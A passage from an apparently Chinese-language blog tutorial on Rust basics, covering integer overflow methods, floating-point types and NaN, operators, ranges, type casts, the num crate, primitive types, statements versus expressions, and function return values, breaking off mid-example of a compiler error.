的情况下，256 变成 0，257 变成 1，依此类推。程序不会 <em>panic</em>，但是该变量的值可能不是你期望的值。依赖这种默认行为的代码都应该被认为是错误的代码。</p><p>要显式处理可能的溢出，可以使用标准库针对原始数字类型提供的这些方法：</p><ul><li>使用 <code>wrapping_*</code> 方法在所有模式下都按照补码循环溢出规则处理，例如 <code>wrapping_add</code></li><li>如果使用 <code>checked_*</code> 方法时发生溢出，则返回 <code>None</code> 值</li><li>使用 <code>overflowing_*</code> 方法返回该值和一个指示是否存在溢出的布尔值</li><li>使用 <code>saturating_*</code> 方法，可以限定计算后的结果不超过目标类型的最大值或低于最小值，例如:</li></ul><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//101没有超过u8的最大值，过可以返回101</span></span><br><span class="line"><span class="built_in">assert_eq!</span>(<span class="number">100u8</span>.<span class="title function_ invoke__">saturating_add</span>(<span class="number">1</span>), <span class="number">101</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment">//尝试将 255 加上 127 时，结果 382 超出了 u8 能表示的最大值（255）。但是，saturating_add 会确保不会发生溢出，而是返回 u8 类型的最大值 255。</span></span><br><span class="line"><span class="built_in">assert_eq!</span>(<span class="type">u8</span>::MAX.<span class="title function_ invoke__">saturating_add</span>(<span class="number">127</span>), <span class="type">u8</span>::MAX);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>下面是一个演示wrapping_*方法的示例</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">a</span> : <span class="type">u8</span> = <span class="number">255</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">b</span> = a.<span class="title function_ invoke__">wrapping_add</span>(<span class="number">20</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, b);  <span class="comment">// 19</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出是19，相当于是275mod256&#x3D;19</p><h5 id="浮点类型"><a href="#浮点类型" class="headerlink" title="浮点类型"></a>浮点类型</h5><p>浮点类型数字是带有小数点的数字，在rust中浮点类型也有两种基本类型:f32和f64，分别为32位和64位大小。默认浮点类型是f64，在线代的CPU中它的速度与f32几乎相同，但精度更高</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = <span class="number">2.0</span>; <span class="comment">// f64</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">y</span>: <span class="type">f32</span> = <span class="number">3.0</span>; <span class="comment">// f32</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>f32</code> 类型是单精度浮点型，<code>f64</code> 为双精度。</p><p>注意：1.<strong>浮点数往往是你想要数字的近似表达</strong> </p><p>​2.<strong>浮点数在某些特性上是反直觉的</strong></p><p>所以有些浮点数虽然看上去相等，但由于精度问题，并不相等</p><h6 id="NaN"><a href="#NaN" class="headerlink" title="NaN"></a>NaN</h6><p>对于数学上未定义的结果，例如对负数取平方根 <code>-42.1.sqrt()</code> ，会产生一个特殊的结果：Rust 的浮点数类型使用 <code>NaN</code> (not a number) 来处理这些情况。</p><p>**所有跟 <code>NaN</code> 交互的操作，都会返回一个 <code>NaN</code>**，而且 <code>NaN</code> 不能用来比较，下面的代码会崩溃：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">  <span class="keyword">let</span> <span class="variable">x</span> = (-<span class="number">42.0_f32</span>).<span class="title function_ invoke__">sqrt</span>();</span><br><span class="line">  <span class="built_in">assert_eq!</span>(x, x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>出于防御性编程的考虑，可以使用 <code>is_nan()</code> 等方法，可以用来判断一个数值是否是 <code>NaN</code> ：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = (-<span class="number">42.0_f32</span>).<span class="title function_ invoke__">sqrt</span>();</span><br><span class="line">    <span class="keyword">if</span> x.<span class="title function_ invoke__">is_nan</span>() &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;未定义的数学行为&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以NaN的用处大概是用来抛出计算过程中的异常的</p><h5 id="数字运算"><a href="#数字运算" class="headerlink" title="数字运算"></a>数字运算</h5><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="comment">// 加法</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">sum</span> = <span class="number">5</span> + <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 减法</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">difference</span> = <span class="number">95.5</span> - <span class="number">4.3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 乘法</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">product</span> = <span class="number">4</span> * <span class="number">30</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 除法</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">quotient</span> = <span class="number">56.7</span> / <span class="number">32.2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 求余</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">remainder</span> = <span class="number">43</span> % <span class="number">5</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这些语句中的每个表达式都使用了数学运算符，并且计算结果绑定到一个变量上，<a href="https://course.rs/appendix/operators.html#%E8%BF%90%E7%AE%97%E7%AC%A6">附录 B</a> 中给出了 Rust 提供的所有运算符的列表。</p><p>再来看一个综合性的示例：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">  <span class="comment">// 编译器会进行自动推导，给予twenty i32的类型</span></span><br><span class="line">  <span class="keyword">let</span> <span class="variable">twenty</span> = <span class="number">20</span>;</span><br><span class="line">  <span class="comment">// 类型标注</span></span><br><span class="line">  <span class="keyword">let</span> <span class="variable">twenty_one</span>: <span class="type">i32</span> = <span class="number">21</span>;</span><br><span class="line">  <span class="comment">// 通过类型后缀的方式进行类型标注：22是i32类型</span></span><br><span class="line">  <span class="keyword">let</span> <span class="variable">twenty_two</span> = <span class="number">22i32</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 只有同样类型，才能运算</span></span><br><span class="line">  <span class="keyword">let</span> <span class="variable">addition</span> = twenty + twenty_one + twenty_two;</span><br><span class="line">  <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125; + &#123;&#125; + &#123;&#125; = &#123;&#125;&quot;</span>, twenty, twenty_one, twenty_two, addition);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 对于较长的数字，可以用_进行分割，提升可读性</span></span><br><span class="line">  <span class="keyword">let</span> <span class="variable">one_million</span>: <span class="type">i64</span> = <span class="number">1_000_000</span>;</span><br><span class="line">  <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, one_million.<span class="title function_ invoke__">pow</span>(<span class="number">2</span>));</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 定义一个f32数组，其中42.0会自动被推导为f32类型</span></span><br><span class="line">  <span class="keyword">let</span> <span class="variable">forty_twos</span> = [</span><br><span class="line">    <span class="number">42.0</span>,</span><br><span class="line">    <span class="number">42f32</span>,</span><br><span class="line">    <span class="number">42.0_f32</span>,</span><br><span class="line">  ];</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 打印数组中第一个值，并控制小数位为2位</span></span><br><span class="line">  <span class="built_in">println!</span>(<span class="string">&quot;&#123;:.2&#125;&quot;</span>, forty_twos[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="位运算"><a href="#位运算" class="headerlink" title="位运算"></a>位运算</h5><p>Rust 的位运算基本上和其他语言一样</p><table><thead><tr><th>运算符</th><th>说明</th></tr></thead><tbody><tr><td>&amp; 位与</td><td>相同位置均为1时则为1，否则为0</td></tr><tr><td>| 位或</td><td>相同位置只要有1时则为1，否则为0</td></tr><tr><td>^ 异或</td><td>相同位置不相同则为1，相同则为0</td></tr><tr><td>! 位非</td><td>把位中的0和1相互取反，即0置为1，1置为0</td></tr><tr><td>&lt;&lt; 左移</td><td>所有位向左移动指定位数，右位补0</td></tr><tr><td>&gt;&gt; 右移</td><td>所有位向右移动指定位数，带符号移动（正数补0，负数补1）</td></tr></tbody></table><h5 id="序列"><a href="#序列" class="headerlink" title="序列"></a>序列</h5><p>用<code>..</code>来表示范围，例如 <code>1..5</code>，生成从 1 到 4 的连续数字，不包含 5 ；<code>1..=5</code>，生成从 1 到 5 的连续数字，包含 5，它的用途很简单，常常用于循环中：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> <span class="variable">i</span> <span class="keyword">in</span> <span class="number">1</span>..=<span class="number">5</span> &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>,i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最终程序输出1到5</p><p><strong>注意</strong>:序列只允许用于数字或字符类型，原因是：它们可以连续，同时编译器在编译期可以检查该序列是否为空，字符和数字值是 Rust 中仅有的可以用于判断是否为空的类型。</p><h5 id="使用-As-完成类型转换"><a href="#使用-As-完成类型转换" class="headerlink" title="使用 As 完成类型转换"></a>使用 As 完成类型转换</h5><p>Rust 中可以使用 As 来完成一个类型到另一个类型的转换，其最常用于将原始类型转换为其他原始类型，但是它也可以完成诸如将指针转换为地址、地址转换为指针以及将指针转换为其他指针等功能。你可以在<a href="https://course.rs/advance/into-types/converse.html">这里</a>了解更多相关的知识。</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">   <span class="keyword">let</span> <span class="variable">a</span> = <span class="number">3.1</span> <span class="keyword">as</span> <span class="type">i8</span>;</span><br><span class="line">   <span class="keyword">let</span> <span class="variable">b</span> = <span class="number">100_i8</span> <span class="keyword">as</span> <span class="type">i32</span>;</span><br><span class="line">   <span class="keyword">let</span> <span class="variable">c</span> = <span class="string">&#x27;a&#x27;</span> <span class="keyword">as</span> <span class="type">u8</span>; <span class="comment">// 将字符&#x27;a&#x27;转换为整数，97</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;,&#123;&#125;,&#123;&#125;&quot;</span>,a,b,c)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="有理数和复数"><a href="#有理数和复数" class="headerlink" title="有理数和复数"></a>有理数和复数</h5><p>Rust 的标准库相比其它语言，准入门槛较高，因此有理数和复数并未包含在标准库中：</p><ul><li>有理数和复数</li><li>任意大小的整数和任意精度的浮点数</li><li>固定精度的十进制小数，常用于货币相关的场景</li></ul><p>好在社区已经开发出高质量的 Rust 数值库：<a href="https://crates.io/crates/num">num</a>。</p><p>按照以下步骤来引入 <code>num</code> 库：</p><ol><li>创建新工程 <code>cargo new complex-num &amp;&amp; cd complex-num</code></li><li>在 <code>Cargo.toml</code> 中的 <code>[dependencies]</code> 下添加一行 <code>num = &quot;0.4.0&quot;</code></li><li>将 <code>src/main.rs</code> 文件中的 <code>main</code> 函数替换为下面的代码</li><li>运行 <code>cargo run</code></li></ol><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> num::complex::Complex;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">   <span class="keyword">let</span> <span class="variable">a</span> = Complex &#123; re: <span class="number">2.1</span>, im: -<span class="number">1.2</span> &#125;;</span><br><span class="line">   <span class="keyword">let</span> <span class="variable">b</span> = Complex::<span class="title function_ invoke__">new</span>(<span class="number">11.1</span>, <span class="number">22.2</span>);</span><br><span class="line">   <span class="keyword">let</span> <span class="variable">result</span> = a + b;</span><br><span class="line"></span><br><span class="line">   <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125; + &#123;&#125;i&quot;</span>, result.re, result.im)</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h4 id="字符、布尔、单元类型"><a href="#字符、布尔、单元类型" class="headerlink" title="字符、布尔、单元类型"></a>字符、布尔、单元类型</h4><h5 id="字符类型-char"><a href="#字符类型-char" class="headerlink" title="字符类型(char)"></a>字符类型(char)</h5><p>在rust中，不仅仅是ASCII，所有的Unicode、単个中文，日文、韩文、emoji 表情符号等等，都是合法的字符类型,占4个字节</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">c</span> = <span class="string">&#x27;z&#x27;</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">z</span> = <span class="string">&#x27;ℤ&#x27;</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">g</span> = <span class="string">&#x27;国&#x27;</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">heart_eyed_cat</span> = &#x27;😻&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="布尔-bool"><a href="#布尔-bool" class="headerlink" title="布尔(bool)"></a>布尔(bool)</h5><p>拥有true和false，占1个字节</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">t</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">f</span>: <span class="type">bool</span> = <span class="literal">false</span>; <span class="comment">// 使用类型标注,显式指定f的类型</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> f &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;这是段毫无意义的代码&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="单元类型"><a href="#单元类型" class="headerlink" title="单元类型"></a>单元类型</h5><p>单元类型就是 <code>()</code></p><h4 id="语句及表达式"><a href="#语句及表达式" class="headerlink" title="语句及表达式"></a>语句及表达式</h4><p>Rust 的函数体是由一系列语句组成，最后由一个表达式来返回值，例如：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">add_with_extra</span>(x: <span class="type">i32</span>, y: <span class="type">i32</span>) <span class="punctuation">-&gt;</span> <span class="type">i32</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = x + <span class="number">1</span>; <span class="comment">// 语句</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">y</span> = y + <span class="number">5</span>; <span class="comment">// 语句</span></span><br><span class="line">   x+y <span class="comment">//表达式</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>语句会执行一些操作但是不会返回一个值，而表达式会在求值后返回一个值，因此在上述函数体的三行代码中，前两行是语句，最后一行是表达式。</p><p>对于 Rust 语言而言，<strong>这种基于语句（statement）和表达式（expression）的方式是非常重要的，你需要能明确的区分这两个概念</strong>，但是对于很多其它语言而言，这两个往往无需区分。基于表达式是函数式语言的重要特征，<strong>表达式总要返回值</strong>。</p><h5 id="语句"><a href="#语句" class="headerlink" title="语句"></a>语句</h5><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">a</span> = <span class="number">8</span>;</span><br><span class="line"><span class="keyword">let</span> <span class="variable">b</span>: <span class="type">Vec</span>&lt;<span class="type">f64</span>&gt; = <span class="type">Vec</span>::<span class="title function_ invoke__">new</span>();</span><br><span class="line"><span class="keyword">let</span> (a, c) = (<span class="string">&quot;hi&quot;</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>以上都是语句，它们完成一个具体的操作，但是并没有返回值，因此是语句</p><p>由于let是语句，那当然不能把一个语句赋给其他值</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">b</span> = (<span class="keyword">let</span> <span class="variable">a</span> = <span class="number">8</span>);</span><br></pre></td></tr></table></figure><p>上述操作会报错</p><h5 id="表达式"><a href="#表达式" class="headerlink" title="表达式"></a>表达式</h5><p>表达式会进行求职，然后返回一个值，例如5+6在求值后会返回11，因此它是一个表达式</p><p>调用一个函数是表达式，因为会返回一个值，调用宏也是表达式，用花括号包裹最终返回一个值的语句块也是表达式，总之，能返回值，它就是表达式:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">y</span> = &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">x</span> = <span class="number">3</span>;</span><br><span class="line">        x + <span class="number">1</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;The value of y is: &#123;&#125;&quot;</span>, y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面使用一个语句块表达式将值赋给 <code>y</code> 变量，语句块长这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">let x=3；</span><br><span class="line">x+1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意:<strong>表达式不能包含分号</strong>。这一点非常重要，一旦你在表达式后加上分号，它就会变成一条语句，再也<strong>不会</strong>返回一个值</p><h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">add</span>(i: <span class="type">i32</span>, j: <span class="type">i32</span>) <span class="punctuation">-&gt;</span> <span class="type">i32</span> &#123;</span><br><span class="line">   i + j</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>声明函数的关键字 <code>fn</code>，函数名 <code>add()</code>，参数 <code>i</code> 和 <code>j</code>，参数类型和返回值类型都是 <code>i32</code></p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503272205857.png" alt="image-20250327220537722" loading="lazy"></p><h5 id="函数要点"><a href="#函数要点" class="headerlink" title="函数要点"></a>函数要点</h5><ul><li>函数名和变量名使用<a href="https://course.rs/practice/naming.html">蛇形命名法(snake case)</a>，例如 <code>fn add_two() -&gt; &#123;&#125;</code></li><li>函数的位置可以随便放，Rust 不关心我们在哪里定义了函数，只要有定义即可</li><li>每个函数参数都需要标注具体类型</li></ul><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="title function_ invoke__">another_function</span>(<span class="number">5</span>, <span class="number">6.1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">another_function</span>(x: <span class="type">i32</span>, y: <span class="type">f32</span>) &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;The value of x is: &#123;&#125;&quot;</span>, x);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;The value of y is: &#123;&#125;&quot;</span>, y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>x:i32的i32是必要的，去掉的话会报错</p><h5 id="函数返回"><a href="#函数返回" class="headerlink" title="函数返回"></a>函数返回</h5><p>在rust中，函数就是表达式，因此我们可以把函数的返回值直接给调用者。</p><p>函数的返回值就是函数体最后一条表达式的返回值，当然我们也可以使用 <code>return</code> 提前返回，下面的函数使用最后一条表达式来返回一个值：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">plus_five</span>(x:<span class="type">i32</span>) <span class="punctuation">-&gt;</span> <span class="type">i32</span> &#123;</span><br><span class="line">    x + <span class="number">5</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = <span class="title function_ invoke__">plus_five</span>(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;The value of x is: &#123;&#125;&quot;</span>, x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>x + 5</code> 是一条表达式，求值后，返回一个值，因为它是函数的最后一行，因此该表达式的值也是函数的返回值。</p><p>再来看两个重点：</p><ol><li><code>let x = plus_five(5)</code>，说明我们用一个函数的返回值来初始化 <code>x</code> 变量，因此侧面说明了在 Rust 中函数也是表达式，这种写法等同于 <code>let x = 5 + 5;</code></li><li><code>x + 5</code> 没有分号，因为它是一条表达式，所以函数最终返回的结果是x+5的结果</li></ol><p>再来看一段代码，同时使用 <code>return</code> 和表达式作为返回值：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">plus_or_minus</span>(x:<span class="type">i32</span>) <span class="punctuation">-&gt;</span> <span class="type">i32</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> x &gt; <span class="number">5</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> x - <span class="number">5</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    x + <span class="number">5</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = <span class="title function_ invoke__">plus_or_minus</span>(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;The value of x is: &#123;&#125;&quot;</span>, x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>plus_or_minus</code> 函数根据传入 <code>x</code> 的大小来决定是做加法还是减法，若 <code>x &gt; 5</code> 则通过 <code>return</code> 提前返回 <code>x - 5</code> 的值,否则返回 <code>x + 5</code> 的值。</p><h5 id="Rust-中的特殊返回类型"><a href="#Rust-中的特殊返回类型" class="headerlink" title="Rust 中的特殊返回类型"></a>Rust 中的特殊返回类型</h5><h6 id="无返回值"><a href="#无返回值" class="headerlink" title="无返回值()"></a>无返回值<code>()</code></h6><p>对于 Rust 新手来说，有些返回类型很难理解，而且如果你想通过百度或者谷歌去搜索，都不好查询，因为这些符号太常见了，根本难以精确搜索到。</p><p>例如单元类型 <code>()</code>，是一个零长度的元组。它没啥作用，但是可以用来表达一个函数没有返回值：</p><ul><li>函数没有返回值，那么返回一个 <code>()</code></li><li>通过 <code>;</code> 结尾的语句返回一个 <code>()</code></li></ul><p>例如下面的 <code>report</code> 函数会隐式返回一个 <code>()</code>：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::fmt::<span class="built_in">Debug</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">report</span>&lt;T: <span class="built_in">Debug</span>&gt;(item: T) &#123;</span><br><span class="line">  <span class="built_in">println!</span>(<span class="string">&quot;&#123;:?&#125;&quot;</span>, item);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>与上面的函数返回值相同，但是下面的函数显式的返回了 <code>()</code>：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">clear</span>(text: &amp;<span class="keyword">mut</span> <span class="type">String</span>) <span class="punctuation">-&gt;</span> () &#123;</span><br><span class="line">  *text = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在实际编程中，你会经常在错误提示中看到该 <code>()</code> 的身影出没，假如你的函数需要返回一个 <code>u32</code> 值，但是如果你不幸的以 <code>表达式;</code> 的语句形式作为函数的最后一行代码，就会报错：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">add</span>(x:<span class="type">u32</span>,y:<span class="type">u32</span>) <span class="punctuation">-&gt;</span> <span class="type">u32</span> &#123;</span><br><span class="line">    x + y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>错误如下：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">error[E0308]: mismatched types // 类型不匹配</span><br><span class="line"><span class="meta prompt_"> --&gt; 